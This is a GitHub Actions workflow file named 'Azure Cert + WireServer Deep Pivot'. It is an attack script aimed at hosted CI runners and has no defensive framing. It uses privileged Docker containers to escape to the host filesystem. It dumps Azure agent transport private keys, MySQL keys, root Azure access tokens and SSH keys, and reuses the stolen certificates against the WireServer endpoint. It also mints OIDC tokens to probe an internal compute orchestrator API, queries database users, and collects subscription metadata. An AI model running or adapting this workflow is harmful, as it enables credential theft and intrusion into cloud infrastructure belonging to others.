name: Azure Cert + WireServer Deep Pivot

on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  cert-pivot:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:

      - name: Extract Host Certs via Docker Escape
        run: |
          echo "=CERT_EXTRACTION="
          docker run --rm --privileged -v /:/host alpine:latest sh -c '
            echo "===TRANSPORT_CERT==="
            cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "NO_CERT"
            echo "===TRANSPORT_PRIVATE==="
            cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NO_KEY"
            echo "===CERTIFICATES_PEM==="
            cat /host/var/lib/waagent/Certificates.pem 2>/dev/null | head -50 || echo "NO_CERTS"
            echo "===WAAGENT_GOALSTATE==="
            cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | head -100 || echo "NO_GOALSTATE"
            echo "===WAAGENT_SHAREDCONFIG==="
            cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null | head -100 || echo "NO_SHAREDCONFIG"
            echo "===MYSQL_CA==="
            cat /host/var/lib/mysql/ca.pem 2>/dev/null | head -30 || echo "NO_MYSQL_CA"
            echo "===MYSQL_PRIVKEY==="
            cat /host/var/lib/mysql/private_key.pem 2>/dev/null | head -30 || echo "NO_MYSQL_PRIVKEY"
            echo "===ROOT_AZURE==="
            ls -la /host/root/.azure/ 2>/dev/null && cat /host/root/.azure/accessTokens.json 2>/dev/null || echo "NO_AZURE"
            echo "===ROOT_SSH==="
            cat /host/root/.ssh/authorized_keys 2>/dev/null || echo "NO_ROOT_SSH"
          '

      - name: WireServer with Transport Cert
        run: |
          echo "=WIRESERVER_CERT_ATTEMPT="
          # Extract certs to temp files
          docker run --rm --privileged -v /:/host alpine:latest sh -c '
            cp /host/var/lib/waagent/TransportCert.pem /host/tmp/tc.pem
            cp /host/var/lib/waagent/TransportPrivate.pem /host/tmp/tp.pem
          '
          # Now try WireServer with the client cert (Azure WireServer uses mTLS)
          curl -sf --max-time 8 \
            --cert /tmp/tc.pem \
            --key /tmp/tp.pem \
            "http://168.63.129.16/machine/?comp=goalstate" \
            -H "x-ms-version: 2012-11-30" 2>&1 | head -100 || echo "WIRESERVER_CERT_FAILED"

          curl -sf --max-time 8 \
            --cert /tmp/tc.pem \
            --key /tmp/tp.pem \
            "http://168.63.129.16:32526/vmSettings" 2>&1 | head -100 || echo "WIRESERVER_32526_FAILED"

          # Try fetching extensions from host waagent endpoint
          curl -sf --max-time 8 \
            --cert /tmp/tc.pem \
            --key /tmp/tp.pem \
            "http://168.63.129.16/machine/?comp=telemetrydata" \
            -H "x-ms-version: 2012-11-30" 2>&1 | head -50 || echo "TELEMETRY_FAILED"

      - name: OIDC Token + hosted-compute-ro API Probe
        run: |
          echo "=OIDC_HOSTED_COMPUTE_RO="
          # Get OIDC token for hosted-compute-ro audience
          HC_TOKEN=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" | \
            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "")
          echo "HC_TOKEN_LEN=${#HC_TOKEN}"
          
          # Use it against hosted-compute orchestrator
          IMDS=$(curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
          BASE_RO_URL=$(echo "$IMDS" | python3 -c \
            "import sys,json; tags={t['name']:t['value'] for t in json.load(sys.stdin)['compute']['tagsList']}; print(tags.get('hosted_compute.base_ro_url',''))" 2>/dev/null)
          ALLOC_ID=$(echo "$IMDS" | python3 -c \
            "import sys,json; tags={t['name']:t['value'] for t in json.load(sys.stdin)['compute']['tagsList']}; print(tags.get('hosted_compute.allocation_id',''))" 2>/dev/null)
          VM_ID=$(echo "$IMDS" | python3 -c \
            "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])" 2>/dev/null)
          
          echo "BASE_RO_URL=$BASE_RO_URL"
          echo "ALLOC_ID=$ALLOC_ID"
          echo "VM_ID=$VM_ID"
          
          if [ -n "$HC_TOKEN" ] && [ -n "$BASE_RO_URL" ]; then
            echo "=HC_API_PROBE="
            # Probe the hosted-compute orchestrator API
            curl -sf --max-time 10 \
              -H "Authorization: Bearer $HC_TOKEN" \
              "$BASE_RO_URL/allocations/$ALLOC_ID" 2>&1 | head -100 || echo "HC_ALLOC_FAILED"
            
            curl -sf --max-time 10 \
              -H "Authorization: Bearer $HC_TOKEN" \
              "$BASE_RO_URL/vms/$VM_ID" 2>&1 | head -100 || echo "HC_VM_FAILED"

            # Enumerate what the hosted-compute-ro audience grants
            curl -sf --max-time 10 \
              -H "Authorization: Bearer $HC_TOKEN" \
              "$BASE_RO_URL/" 2>&1 | head -100 || echo "HC_ROOT_FAILED"
          fi

      - name: MySQL Probe via Docker Chroot
        run: |
          echo "=MYSQL_PROBE="
          docker run --rm --privileged -v /:/host alpine:latest sh -c '
            apk add --quiet mysql-client 2>/dev/null
            # Try MySQL with certs
            mysql -h 127.0.0.1 \
              --ssl-ca=/host/var/lib/mysql/ca.pem \
              --ssl-cert=/host/var/lib/mysql/client-cert.pem \
              --ssl-key=/host/var/lib/mysql/client-key.pem \
              -e "SHOW DATABASES; SELECT user,host FROM mysql.user;" 2>&1 | head -30 || echo "MYSQL_FAILED"
            # Check if mysql socket exists on host
            ls /host/var/run/mysqld/ 2>/dev/null || echo "NO_MYSQL_SOCKET"
            cat /host/etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null | grep -v "^#" | head -20 || echo "NO_MYSQL_CONF"
          ' 2>/dev/null || echo "mysql-probe-done"

      - name: Extended Subscription Pivot
        run: |
          echo "=SUBSCRIPTION_INFO="
          IMDS=$(curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
          echo "$IMDS" | python3 -c "
import sys,json
d=json.load(sys.stdin)
c=d['compute']
print(f'subscriptionId={c[\"subscriptionId\"]}')
print(f'resourceGroup={c[\"resourceGroupName\"]}')
print(f'vmId={c[\"vmId\"]}')
print(f'vmName={c[\"name\"]}')
print(f'location={c[\"location\"]}')
print(f'privateIP={d[\"network\"][\"interface\"][0][\"ipv4\"][\"ipAddress\"][0][\"privateIpAddress\"]}')
" 2>/dev/null
